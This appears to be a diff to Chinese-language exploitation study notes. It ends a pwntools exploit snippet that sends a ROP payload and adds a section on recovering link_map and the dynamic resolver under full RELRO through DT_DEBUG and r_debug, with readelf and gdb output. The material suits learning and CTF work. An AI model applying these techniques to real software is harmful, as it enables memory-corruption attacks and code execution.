@@ -189,4 +189,50 @@ raw_input('#')
 r.send(('A'*18 + p32(buf+1024+4)).ljust(1024, '\0') + rop.ljust(1024, '\0') + data)
 r.interactive()
 ```
-2:47
+
+#### full relro:重新找回link_map和resolver
+找回link_map
+- `.dynamic`中DT_DEBUG指向r_debug结构
+- r_debug中r_map指向link_map
+
+找回resolver
+- 先用l_next多走一层,再用l_info[DT_PLTGOT]找出library的`.got.plt`地址
+- 因为大部分library都不是full relro,所以library的got2回事resolver
+
+`readelf -aW full | less`
+
+```
+Dynamic section at offset 0xee8 contains 26 entries:
+  标记        类型                         名称/值
+ 0x00000001 (NEEDED)                     共享库：[libc.so.6]
+ 0x0000000c (INIT)                       0x80482d4
+ 0x0000000d (FINI)                       0x8048504
+ 0x00000019 (INIT_ARRAY)                 0x8049edc
+ 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
+ 0x0000001a (FINI_ARRAY)                 0x8049ee0
+ 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
+ 0x6ffffef5 (GNU_HASH)                   0x80481ac
+ 0x00000005 (STRTAB)                     0x804822c
+ 0x00000006 (SYMTAB)                     0x80481cc
+ 0x0000000a (STRSZ)                      81 (bytes)
+ 0x0000000b (SYMENT)                     16 (bytes)
+ 0x00000015 (DEBUG)                      0x0					#第十二个entry
+```
+```
+readelf -aW partial | grep dynamic
+  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
+```
+```
+p/x ((Elf32_Dyn*)0x08049f14)[12]
+```
+```
+0x00000015	0xf7ffd8e4
+```
+```
+x/32wx 0xf7ffd8e4
+0xf7ffd8e4 <_r_debug>:	0x00000001	0xf7ffd900	0xf7fea800	0x00000000
+0xf7ffd8f4 <_r_debug+16>:	0xf7fda000	0x00000000	0x00000000	0x00000000
+```
+第二个值`0xf7ffd900`就是linkmap
+
+
